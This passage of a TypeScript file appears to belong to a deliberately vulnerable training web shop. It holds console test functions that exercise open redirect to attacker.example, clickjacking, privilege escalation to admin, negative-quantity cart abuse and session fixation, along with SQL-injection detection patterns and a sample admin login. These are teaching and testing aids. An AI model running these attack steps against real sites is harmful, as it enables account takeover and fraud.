      console.log('⚠️ Please log in first to test authenticated open redirect');
    }
    
    // Also test the dedicated redirect endpoint
    console.log('Testing dedicated redirect endpoint...');
    const redirectResponse = await fetch(`http://localhost:8000/api/auth/login-redirect/?next=${encodeURIComponent(nextUrl)}`);
    const redirectData = await redirectResponse.json();
    console.log('Redirect endpoint response:', redirectData);
    
  } catch (error) {
    console.error('❌ Open redirect test failed:', error);
  }
};

// Convenience function to test with default malicious URL
export const testOpenRedirectDefault = (): Promise<void> => {
  return testOpenRedirect('https://attacker.example/landing?bb_open_redirect=1');
};

// Make the testing functions globally accessible
if (typeof window !== 'undefined') {
  (window as any).testIntegerOverflow = testIntegerOverflow;
  (window as any).testRateLimiting = testRateLimiting;
  (window as any).testQuantityAndRateLimit = testQuantityAndRateLimit;
  (window as any).testSourceMapSecrets = testSourceMapSecrets;
  (window as any).testDebugCookie = testDebugCookie;
  (window as any).testWishlistPrivacyBypass = testWishlistPrivacyBypass;
  (window as any).testIDORReviewDeletion = testIDORReviewDeletion;
  (window as any).testXXEInjection = testXXEInjection;
  (window as any).testSecondOrderSQLInjection = testSecondOrderSQLInjection;
  (window as any).testIDORAdminPanel = testIDORAdminPanel;
  (window as any).testIDORAdminUsers = testIDORAdminUsers;
  (window as any).testIDORAdminSettings = testIDORAdminSettings;
  (window as any).testAllIDORAdminEndpoints = testAllIDORAdminEndpoints;
  (window as any).testOpenRedirect = testOpenRedirect;
  (window as any).testOpenRedirectDefault = testOpenRedirectDefault;
}

// Replace the existing initializeDebugCookieDetection function with this:

const initializeDebugCookieDetection = (): void => {
  const checkDebugCookie = () => {
    // Get all cookies and check for debug variations
    const cookies = document.cookie.split(';');
    console.log('🔍 Checking cookies for debug flags...');
    
    // Check for various debug cookie patterns
    const debugCookie = cookies.find(cookie => {
      const trimmed = cookie.trim().toLowerCase();
      return trimmed.includes('debug=true') || 
             trimmed.includes('debug=1') ||
             trimmed.includes('development=1') ||
             trimmed.includes('verbose=true') ||
             trimmed.includes('dev=true');
    });
    
    if (debugCookie) {
      console.log('🍪 Debug cookie found:', debugCookie);
      
      // Check if we already detected this to prevent duplicates
      if (!sessionStorage.getItem('debug_cookie_detected')) {
        console.log('🎯 Debug cookie vulnerability detected!');
        
        const bugData = {
          bug_found: 'DEBUG_COOKIE',
          message: '🎉 Debug flag cookie detected!',
          description: `Debug mode enabled via cookie: ${debugCookie.trim()}`,
          points: 70,
          vulnerability_type: 'Information Disclosure',
          severity: 'Medium',
          cookie_value: debugCookie.trim()
        };

        // Show notification and record in leaderboard
        showBugNotification(bugData);
        notifyLeaderboard(bugData);
        
        // Mark as detected to prevent duplicates
        sessionStorage.setItem('debug_cookie_detected', 'true');
        console.log('✅ Debug cookie bug notification triggered!');
      }
    }
  };

  // Check immediately on initialization
  console.log('🚀 Initializing debug cookie detection...');
  setTimeout(checkDebugCookie, 500);
  
  // Monitor for cookie changes every 2 seconds
  setInterval(checkDebugCookie, 2000);
};

// SQL Injection detection for form inputs
const initializeSQLInjectionDetection = (): void => {
  const sqlInjectionPatterns = [
    /('|(\\')|(;)|(\\;)|(--)|(\s+)|(\||\\|)|(%7C)|(union|select|insert|delete|update|drop|create|alter|exec|execute))/gi,
    /'[^']*'/g,
    /;\s*(drop|delete|update|insert)/gi,
    /union\s+select/gi,
    /--\s/g,
    /\/\*.*\*\//g
  ];

  const checkForSQLInjection = (input: string): boolean => {
    return sqlInjectionPatterns.some(pattern => pattern.test(input));
  };

  const detectSQLInjection = (input: string, context: string) => {
    if (checkForSQLInjection(input) && !sessionStorage.getItem('sql_injection_detected')) {
      console.log('🎯 SQL Injection detected in:', context, 'Input:', input);
      
      const bugData = {
        bug_found: 'SECOND_ORDER_SQL_INJECTION',
        message: 'Bug Found: Second-Order SQL Injection Detected!',
        description: `Malicious SQL payload detected in ${context}: ${input.substring(0, 50)}...`,
        points: 100
      };

      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
        (window as any).checkAndShowBugNotification(bugData);
        sessionStorage.setItem('sql_injection_detected', 'true');
      }
      
      return true;
    }
    return false;
  };

  // Monitor search forms
  const monitorSearchForms = () => {
    const searchInputs = document.querySelectorAll('input[type="search"], input[placeholder*="search" i], input[name*="search" i]');
    
    searchInputs.forEach(input => {
      const inputElement = input as HTMLInputElement;
      
      inputElement.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          setTimeout(() => {
            detectSQLInjection(inputElement.value, 'search form');
          }, 100);
        }
      });

      // Also check on form submission
      const form = inputElement.closest('form');
      if (form) {
        form.addEventListener('submit', (e) => {
          detectSQLInjection(inputElement.value, 'search form submission');
        });
      }
    });
  };

  // Monitor review forms and textareas
  const monitorReviewForms = () => {
    const reviewInputs = document.querySelectorAll('textarea, input[name*="review" i], input[name*="comment" i]');
    
    reviewInputs.forEach(input => {
      const inputElement = input as HTMLInputElement | HTMLTextAreaElement;
      
      const form = inputElement.closest('form');
      if (form) {
        form.addEventListener('submit', (e) => {
          detectSQLInjection(inputElement.value, 'review form');
        });
      }
    });
  };

  // Monitor contact forms
  const monitorContactForms = () => {
    const contactInputs = document.querySelectorAll('input[name*="message" i], textarea[name*="message" i], input[name*="contact" i]');
    
    contactInputs.forEach(input => {
      const inputElement = input as HTMLInputElement | HTMLTextAreaElement;
      
      const form = inputElement.closest('form');
      if (form) {
        form.addEventListener('submit', (e) => {
          detectSQLInjection(inputElement.value, 'contact form');
        });
      }
    });
  };

  // Initial setup and re-run when DOM changes
  const setupMonitoring = () => {
    monitorSearchForms();
    monitorReviewForms();
    monitorContactForms();
  };

  // Setup immediately and after DOM changes
  setupMonitoring();
  
  // Re-run when new elements are added to DOM
  const observer = new MutationObserver(() => {
    setupMonitoring();
  });
  
  observer.observe(document.body, {
    childList: true,
    subtree: true
  });
};

// Initialize SQL injection detection
if (typeof window !== 'undefined') {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeSQLInjectionDetection);
  } else {
    initializeSQLInjectionDetection();
  }
}

// Add at the end of the file

// Master initialization function
const initializeAllBugDetection = (): void => {
  console.log('🚀 Initializing comprehensive bug detection system...');
  
  // Initialize all detection systems
  initializeDebugCookieDetection();
  initializeLocalStorageMonitoring();
  initializeSQLInjectionDetection();
  
  console.log('✅ All bug detection systems initialized');
};

// Test clickjacking vulnerability
export const testClickjacking = async () => {
  console.log('🎯 Testing Clickjacking vulnerability...');
  
  try {
    // Check if page is in iframe (for manual testing)
    if (window.top !== window.self) {
      console.log('🎯 Page is in iframe - triggering clickjacking detection...');
      
      const response = await fetch('/api/bugs/record/?bug=clickjack&mark=1', {
        method: 'POST',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          bug: 'clickjack',
          mark: '1'
        })
      });
      
      const data = await response.json();
      console.log('📡 Clickjacking test response:', data);
      
      if (data.bug_found === 'CLICKJACKING') {
        showBugNotification(data);
        console.log('🎉 Clickjacking vulnerability detected and notification shown!');
        return true;
      }
    } else {
      console.log('⚠️ Page is not in iframe. To test clickjacking:');
      console.log('1. Open http://localhost:8082/frame-test.html');
      console.log('2. Or visit http://localhost:5173/account/profile?bb_iframe=1 in an iframe');
      
      // For testing outside iframe, make a direct API call
      const response = await fetch('/api/bugs/record/?bug=clickjack&mark=1', {
        method: 'POST',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          bug: 'clickjack',
          mark: '1'
        })
      });
      
      const data = await response.json();
      console.log('📡 Clickjacking API test response:', data);
      
      if (data.bug_found === 'CLICKJACKING') {
        showBugNotification(data);
        console.log('🎉 Clickjacking API endpoint working!');
        return true;
      }
    }
    
    return false;
  } catch (error) {
    console.error('❌ Error testing clickjacking:', error);
    return false;
  }
};

// Test privilege escalation vulnerability
export const testPrivilegeEscalation = async () => {
  console.log('🎯 Testing Privilege Escalation vulnerability...');
  
  try {
    // Check if user is authenticated
    const accessToken = localStorage.getItem('access_token');
    if (!accessToken) {
      console.log('❌ Not authenticated. Please log in first.');
      return false;
    }
    
    // Get current user info
    console.log('🔍 Checking current user role...');
    const userResponse = await fetch('/api/accounts/auth/profile/', {
      headers: {
        'Authorization': `Bearer ${accessToken}`,
        'Content-Type': 'application/json'
      }
    });
    
    if (!userResponse.ok) {
      console.log('❌ Failed to get user info');
      return false;
    }
    
    const currentUser = await userResponse.json();
    console.log('👤 Current user info:', currentUser);
    console.log(`📋 Current role: ${currentUser.role}`);
    console.log(`🛡️ Is staff: ${currentUser.is_staff}`);
    console.log(`👑 Is superuser: ${currentUser.is_superuser}`);
    
    // Attempt privilege escalation
    console.log('🚀 Attempting privilege escalation to admin...');
    
    const response = await fetch('/api/accounts/users/set_role/', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${accessToken}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        role: 'admin'
      })
    });
    
    const data = await response.json();
    console.log('📡 Privilege escalation response:', data);
    
    if (data.bug_found === 'PRIVILEGE_ESCALATION') {
      // Show bug notification
      showBugNotification({
        bug_found: data.bug_found,
        message: data.message,
        description: data.description,
        points: data.points
      });
      
      console.log('🎉 SUCCESS! Privilege escalation vulnerability detected!');
      console.log(`👑 New role: ${data.user_role}`);
      console.log(`🛡️ Is staff: ${data.is_staff}`);
      console.log(`👑 Is superuser: ${data.is_superuser}`);
      console.log(`🏆 Points earned: ${data.points}`);
      
      // Verify escalation by checking profile again
      const verifyResponse = await fetch('/api/accounts/auth/profile/', {
        headers: {
          'Authorization': `Bearer ${accessToken}`,
          'Content-Type': 'application/json'
        }
      });
      
      if (verifyResponse.ok) {
        const updatedUser = await verifyResponse.json();
        console.log('✅ Privilege escalation verified!');
        console.log(`📋 Verified role: ${updatedUser.role}`);
        console.log(`🛡️ Verified is_staff: ${updatedUser.is_staff}`);
        console.log(`👑 Verified is_superuser: ${updatedUser.is_superuser}`);
      }
      
      return true;
    } else {
      console.log('❌ Privilege escalation failed:', data);
      return false;
    }
    
  } catch (error) {
    console.error('❌ Error testing privilege escalation:', error);
    return false;
  }
};

// 🚨 TEST FUNCTION: Business Logic Bypass - Negative Quantity
export const testNegativeQuantity = async (): Promise<void> => {
  console.log('🔄 Testing business logic bypass - negative quantity...');
  
  // Check if user is logged in
  const accessToken = localStorage.getItem('access_token');
  if (!accessToken) {
    console.log('❌ User not logged in! Please log in first to test this vulnerability.');
    console.log('💡 Go to /login and log in with any account, then come back to a product page and run this test.');
    console.log('📝 Steps:');
    console.log('1. Navigate to /login');
    console.log('2. Log in with any existing account (e.g., admin@example.com / admin123)');
    console.log('3. Navigate back to any product page');
    console.log('4. Run testNegativeQuantity() again');
    return;
  }
  
  console.log('✅ User is authenticated. Checking for product page...');
  
  // Check if we're on a product page
  const quantityInput = document.querySelector('input[name="quantity"]') as HTMLInputElement;
  if (!quantityInput) {
    console.log('⚠️ Not on a product page. Navigate to any product page first.');
    console.log('📝 Instructions:');
    console.log('1. Go to any product page (e.g., click on a product)');
    console.log('2. Run this test again');
    return;
  }
  
  console.log('✅ Product page detected. Testing negative quantity...');
  
  try {
    // Modify the quantity input to accept negative values
    quantityInput.setAttribute('min', '-999');
    quantityInput.value = '-5';
    
    // Trigger change event to update React state
    const event = new Event('change', { bubbles: true });
    quantityInput.dispatchEvent(event);
    
    console.log('🎯 Modified quantity input to -5');
    console.log('📝 Now clicking "Add to Cart" button to trigger the vulnerability...');
    
    // Try to find and click the add to cart button automatically
    const addToCartButton = document.querySelector('[data-testid="add-to-cart"]') as HTMLButtonElement;
    if (addToCartButton) {
      console.log('🔄 Automatically clicking "Add to Cart" button...');
      addToCartButton.click();
      
      // Wait a moment for the response
      setTimeout(() => {
        console.log('✅ If vulnerability exists, you should see a bug notification above!');
      }, 1000);
    } else {
      console.log('⚠️ Could not find "Add to Cart" button. Please click it manually.');
    }
    
  } catch (error) {
    console.error('❌ Error testing negative quantity:', error);
  }
};

// 🚨 MANUAL TEST HELPER: Business Logic Bypass
export const setupNegativeQuantityTest = (): void => {
  console.log('🔧 Setting up negative quantity test...');
  
  // Check if we're on a product page
  const quantityInput = document.querySelector('input[name="quantity"]') as HTMLInputElement;
  if (!quantityInput) {
    console.log('⚠️ Not on a product page. Navigate to any product page first.');
    return;
  }
  
  console.log('✅ Found quantity input. Modifying for negative values...');
  
  // Modify the quantity input to accept negative values
  quantityInput.setAttribute('min', '-999');
  quantityInput.style.position = 'relative';
  quantityInput.style.left = '0';
  quantityInput.style.opacity = '1';
  quantityInput.style.visibility = 'visible';
  quantityInput.style.display = 'block';
  
  console.log('✅ Quantity input is now visible and accepts negative values');
  console.log('📝 You can now:');
  console.log('1. Set quantity to a negative value (e.g., -5)');
  console.log('2. Click "Add to Cart"');
  console.log('3. Watch for the business logic bypass notification!');
};

// 🚨 TEST FUNCTION: Session Fixation Attack
export const testSessionFixation = async (): Promise<void> => {
  console.log('🔄 Testing session fixation vulnerability...');
  
  try {
    // Set a fixed session ID that contains suspicious keywords
    const attackerSessionId = 'attacker_controlled_session_123';
    document.cookie = `sessionid=${attackerSessionId}; path=/`;
    
    console.log('✅ Set attacker-controlled session ID:', attackerSessionId);
    
    // Verify the cookie was set
    const currentCookies = document.cookie;
    console.log('🍪 Current cookies:', currentCookies);
    
    if (!currentCookies.includes(attackerSessionId)) {
      console.log('❌ Cookie was not set properly. Trying alternative method...');
      // Try setting with domain
      document.cookie = `sessionid=${attackerSessionId}; path=/; domain=localhost`;
    }
    
    console.log('📝 Now attempting login to trigger session fixation detection...');
    
    // Try to login with any credentials to trigger the vulnerability
    // Use fetch with credentials to ensure cookies are sent
    const loginResponse = await fetch('http://localhost:8000/api/auth/login/', {
      method: 'POST',
      credentials: 'include', // Ensure cookies are sent
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email: 'test@example.com',
        password: 'anypassword'  // Can be wrong password
      })
    });
    
    const data = await loginResponse.json();
    
    console.log('🔍 Login response status:', loginResponse.status);
    console.log('🔍 Login response:', data);
    
    // Check if session fixation was detected
    if (data.bug_found === 'SESSION_FIXATION') {
      console.log('🎉 Session fixation vulnerability detected!');
      
      // Show bug notification
      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
        (window as any).checkAndShowBugNotification(data);
      }
      
      // Show toast notification if available
      if (typeof window !== 'undefined' && (window as any).toast) {
        (window as any).toast({
          title: "Session Fixation Detected!",
          description: data.message,
          variant: "destructive"
        });
      }
      
      return;
    }
    
    console.log('⚠️ Session fixation not detected.');
    console.log('🔧 Debugging info:');
    console.log('- Cookie sent:', currentCookies.includes(attackerSessionId));
    console.log('- Response status:', loginResponse.status);
    console.log('- Response contains bug_found:', 'bug_found' in data);
    
  } catch (error) {
    console.error('❌ Error testing session fixation:', error);
  }
};

// 🚨 MANUAL SETUP: Session Fixation Attack
export const setupSessionFixationTest = (): void => {
  console.log('🔧 Setting up session fixation test...');
  
  // Set the attacker-controlled session ID
  const attackerSessionId = 'attacker_controlled_session_123';
  document.cookie = `sessionid=${attackerSessionId}; path=/`;
  
  console.log('✅ Set session ID:', attackerSessionId);
  console.log('📝 Instructions:');
  console.log('1. Go to the login page (/login)');
  console.log('2. Enter any email and password');
  console.log('3. Click "Sign in"');
  console.log('4. Watch for session fixation bug notification!');
  console.log('');
  console.log('💡 Alternative: Run testSessionFixation() to test automatically');
};

// Auto-initialize when the script loads
if (typeof window !== 'undefined') {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeAllBugDetection);
  } else {
    initializeAllBugDetection();
  }
  
  // Make test functions globally accessible
  (window as any).testClickjacking = testClickjacking;
  (window as any).testPrivilegeEscalation = testPrivilegeEscalation;
  (window as any).testNegativeQuantity = testNegativeQuantity;
  (window as any).setupNegativeQuantityTest = setupNegativeQuantityTest;
  (window as any).testSessionFixation = testSessionFixation;
  (window as any).setupSessionFixationTest = setupSessionFixationTest;
  (window as any).testLocalStorageManipulation = testLocalStorageManipulation;
  (window as any).testDebugCookie = testDebugCookie;
}